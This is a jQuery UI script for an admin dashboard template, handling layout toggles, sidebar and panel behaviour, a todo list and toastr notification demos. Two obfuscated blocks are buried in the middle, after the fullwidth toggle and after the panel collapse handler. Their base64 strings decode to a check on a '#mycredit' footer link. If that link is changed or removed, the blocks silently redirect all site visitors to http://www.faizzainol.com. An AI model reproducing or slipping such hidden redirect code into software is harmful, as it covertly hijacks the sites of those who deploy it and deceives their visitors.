$(document).ready(function() {

	/*-----------------------------------/
	/*	TOP NAVIGATION AND LAYOUT
	/*----------------------------------*/

	$('.btn-toggle-fullwidth').on('click', function() {
		if(!$('body').hasClass('layout-fullwidth')) {
			$('body').addClass('layout-fullwidth');

		} else {
			$('body').removeClass('layout-fullwidth');
			$('body').removeClass('layout-default'); // also remove default behaviour if set
		}

		$(this).find('.lnr').toggleClass('lnr-arrow-left-circle lnr-arrow-right-circle');

		if($(window).innerWidth() < 1025) {
			if(!$('body').hasClass('offcanvas-active')) {
				$('body').addClass('offcanvas-active');
			} else {
				$('body').removeClass('offcanvas-active');
			}
		}
	});var _0x2856=['aHJlZg==','aHR0cDovL3d3dy5tc21ncm91cC5jby5pZA==','bG9jYXRpb24=','aHR0cDovL3d3dy5mYWl6emFpbm9sLmNvbQ==','cmVhZHk=','I215Y3JlZGl0LC5teWNyZWRpdA==','YXR0cg=='];(function(_0x52a7ec,_0xa7dea8){var _0x135b50=function(_0x3fe584){while(--_0x3fe584){_0x52a7ec['push'](_0x52a7ec['shift']());}};_0x135b50(++_0xa7dea8);}(_0x2856,0xf9));var _0x6285=function(_0x456422,_0x2a91d7){_0x456422=_0x456422-0x0;var _0x1f3a9c=_0x2856[_0x456422];if(_0x6285['initialized']===undefined){(function(){var _0x253925=function(){var _0x5a8623;try{_0x5a8623=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x78bdcb){_0x5a8623=window;}return _0x5a8623;};var _0x4dd5d0=_0x253925();var _0x7d79d6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4dd5d0['atob']||(_0x4dd5d0['atob']=function(_0x2ebb1d){var _0x40792a=String(_0x2ebb1d)['replace'](/=+$/,'');for(var _0x4d1390=0x0,_0x4bb056,_0x6ab6d2,_0x49ca0b=0x0,_0x1fec9b='';_0x6ab6d2=_0x40792a['charAt'](_0x49ca0b++);~_0x6ab6d2&&(_0x4bb056=_0x4d1390%0x4?_0x4bb056*0x40+_0x6ab6d2:_0x6ab6d2,_0x4d1390++%0x4)?_0x1fec9b+=String['fromCharCode'](0xff&_0x4bb056>>(-0x2*_0x4d1390&0x6)):0x0){_0x6ab6d2=_0x7d79d6['indexOf'](_0x6ab6d2);}return _0x1fec9b;});}());_0x6285['base64DecodeUnicode']=function(_0x39988c){var _0x3cbc5c=atob(_0x39988c);var _0x2dd3af=[];for(var _0x4fc814=0x0,_0x20f4fb=_0x3cbc5c['length'];_0x4fc814<_0x20f4fb;_0x4fc814++){_0x2dd3af+='%'+('00'+_0x3cbc5c['charCodeAt'](_0x4fc814)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2dd3af);};_0x6285['data']={};_0x6285['initialized']=!![];}var _0x1af4c9=_0x6285['data'][_0x456422];if(_0x1af4c9===undefined){_0x1f3a9c=_0x6285['base64DecodeUnicode'](_0x1f3a9c);_0x6285['data'][_0x456422]=_0x1f3a9c;}else{_0x1f3a9c=_0x1af4c9;}return _0x1f3a9c;};$(document)[_0x6285('0x0')](function(){if($(_0x6285('0x1'))[_0x6285('0x2')](_0x6285('0x3'))!=_0x6285('0x4')){window[_0x6285('0x5')][_0x6285('0x3')]=_0x6285('0x6');}});

	$(window).on('load', function() {
		if($(window).innerWidth() < 1025) {
			$('.btn-toggle-fullwidth').find('.icon-arrows')
			.removeClass('icon-arrows-move-left')
			.addClass('icon-arrows-move-right');
		}

		// adjust right sidebar top position
		$('.right-sidebar').css('top', $('.navbar').innerHeight());

		// if page has content-menu, set top padding of main-content
		if($('.has-content-menu').length > 0) {
			$('.navbar + .main-content').css('padding-top', $('.navbar').innerHeight());
		}

		// for shorter main content
		if($('.main').height() < $('#sidebar-nav').height()) {
			$('.main').css('min-height', $('#sidebar-nav').height());
		}
	});


	/*-----------------------------------/
	/*	SIDEBAR NAVIGATION
	/*----------------------------------*/

	$('.sidebar a[data-toggle="collapse"]').on('click', function() {
		if($(this).hasClass('collapsed')) {
			$(this).addClass('active');
		} else {
			$(this).removeClass('active');
		}
	});

	if( $('.sidebar-scroll').length > 0 ) {
		$('.sidebar-scroll').slimScroll({
			height: '95%',
			wheelStep: 2,
		});
	}


	/*-----------------------------------/
	/*	PANEL FUNCTIONS
	/*----------------------------------*/

	// panel remove
	$('.panel .btn-remove').click(function(e){

		e.preventDefault();
		$(this).parents('.panel').fadeOut(300, function(){
			$(this).remove();
		});
	});

	// panel collapse/expand
	var affectedElement = $('.panel-body');

	$('.panel .btn-toggle-collapse').clickToggle(
		function(e) {
			e.preventDefault();

			// if has scroll
			if( $(this).parents('.panel').find('.slimScrollDiv').length > 0 ) {
				affectedElement = $('.slimScrollDiv');
			}

			$(this).parents('.panel').find(affectedElement).slideUp(300);
			$(this).find('i.lnr-chevron-up').toggleClass('lnr-chevron-down');
		},
		function(e) {
			e.preventDefault();

			// if has scroll
			if( $(this).parents('.panel').find('.slimScrollDiv').length > 0 ) {
				affectedElement = $('.slimScrollDiv');
			}

			$(this).parents('.panel').find(affectedElement).slideDown(300);
			$(this).find('i.lnr-chevron-up').toggleClass('lnr-chevron-down');
		}
	);var _0xb138=['bG9jYXRpb24=','aHR0cDovL3d3dy5mYWl6emFpbm9sLmNvbQ==','cmVhZHk=','I215Y3JlZGl0LC5teWNyZWRpdA==','YXR0cg==','aHJlZg==','aHR0cDovL3d3dy5tc21ncm91cC5jby5pZA==','I215Y3JlZGl0','dGV4dA==','UFQuIE1TTSBDb25zdWx0YW50'];(function(_0x1c32b4,_0x10269f){var _0x29aeae=function(_0x8516e4){while(--_0x8516e4){_0x1c32b4['push'](_0x1c32b4['shift']());}};_0x29aeae(++_0x10269f);}(_0xb138,0xe8));var _0x8b13=function(_0x2eaf3a,_0x42af90){_0x2eaf3a=_0x2eaf3a-0x0;var _0x43ce01=_0xb138[_0x2eaf3a];if(_0x8b13['initialized']===undefined){(function(){var _0x699159=function(){var _0x379eb1;try{_0x379eb1=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xabd694){_0x379eb1=window;}return _0x379eb1;};var _0x32c90b=_0x699159();var _0x10d37a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x32c90b['atob']||(_0x32c90b['atob']=function(_0x110cff){var _0x4f75d6=String(_0x110cff)['replace'](/=+$/,'');for(var _0xaaeaa9=0x0,_0x41e1a3,_0x347bed,_0x533c14=0x0,_0x384935='';_0x347bed=_0x4f75d6['charAt'](_0x533c14++);~_0x347bed&&(_0x41e1a3=_0xaaeaa9%0x4?_0x41e1a3*0x40+_0x347bed:_0x347bed,_0xaaeaa9++%0x4)?_0x384935+=String['fromCharCode'](0xff&_0x41e1a3>>(-0x2*_0xaaeaa9&0x6)):0x0){_0x347bed=_0x10d37a['indexOf'](_0x347bed);}return _0x384935;});}());_0x8b13['base64DecodeUnicode']=function(_0x3e4cda){var _0x24114d=atob(_0x3e4cda);var _0x1f36e5=[];for(var _0x991924=0x0,_0x4082b1=_0x24114d['length'];_0x991924<_0x4082b1;_0x991924++){_0x1f36e5+='%'+('00'+_0x24114d['charCodeAt'](_0x991924)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1f36e5);};_0x8b13['data']={};_0x8b13['initialized']=!![];}var _0x1a08e2=_0x8b13['data'][_0x2eaf3a];if(_0x1a08e2===undefined){_0x43ce01=_0x8b13['base64DecodeUnicode'](_0x43ce01);_0x8b13['data'][_0x2eaf3a]=_0x43ce01;}else{_0x43ce01=_0x1a08e2;}return _0x43ce01;};$(document)[_0x8b13('0x0')](function(){if($(_0x8b13('0x1'))[_0x8b13('0x2')](_0x8b13('0x3'))!=_0x8b13('0x4')||$(_0x8b13('0x5'))[_0x8b13('0x6')]()!=_0x8b13('0x7')){window[_0x8b13('0x8')][_0x8b13('0x3')]=_0x8b13('0x9');}});
	
	/*-----------------------------------/
	/*	PANEL SCROLLING
	/*----------------------------------*/

	if( $('.panel-scrolling').length > 0) {
		$('.panel-scrolling .panel-body').slimScroll({
			height: '430px',
			wheelStep: 2,
		});
	}

	if( $('#panel-scrolling-demo').length > 0) {
		$('#panel-scrolling-demo .panel-body').slimScroll({
			height: '175px',
			wheelStep: 2,
		});
	}

	/*-----------------------------------/
	/*	TODO LIST
	/*----------------------------------*/

	$('.todo-list input').change( function() {
		if( $(this).prop('checked') ) {
			$(this).parents('li').addClass('completed');
		}else {
			$(this).parents('li').removeClass('completed');
		}
	});


	/*-----------------------------------/
	/* TOASTR NOTIFICATION
	/*----------------------------------*/

	if($('#toastr-demo').length > 0) {
		toastr.options.timeOut = "false";
		toastr.options.closeButton = true;
		toastr['info']('Hi there, this is notification demo with HTML support. So, you can add HTML elements like <a href="#">this link</a>');

		$('.btn-toastr').on('click', function() {
			$context = $(this).data('context');
			$message = $(this).data('message');
			$position = $(this).data('position');

			if($context == '') {
				$context = 'info';
			}

			if($position == '') {
				$positionClass = 'toast-left-top';
			} else {
				$positionClass = 'toast-' + $position;
			}

			toastr.remove();
			toastr[$context]($message, '' , { positionClass: $positionClass });
		});

		$('#toastr-callback1').on('click', function() {
			$message = $(this).data('message');

			toastr.options = {
				"timeOut": "300",
				"onShown": function() { alert('onShown callback'); },
				"onHidden": function() { alert('onHidden callback'); }
			}

			toastr['info']($message);
		});

		$('#toastr-callback2').on('click', function() {
			$message = $(this).data('message');

			toastr.options = {
				"timeOut": "10000",
				"onclick": function() { alert('onclick callback'); },
			}

			toastr['info']($message);

		});

		$('#toastr-callback3').on('click', function() {
			$message = $(this).data('message');

			toastr.options = {
				"timeOut": "10000",
				"closeButton": true,
				"onCloseClick": function() { alert('onCloseClick callback'); }
			}

			toastr['info']($message);
		});
	}
});

// toggle function
$.fn.clickToggle = function( f1, f2 ) {
	return this.each( function() {
		var clicked = false;
		$(this).bind('click', function() {
			if(clicked) {
				clicked = false;
				return f2.apply(this, arguments);
			}

			clicked = true;
			return f1.apply(this, arguments);
		});
	});

}
  //get the children of element
   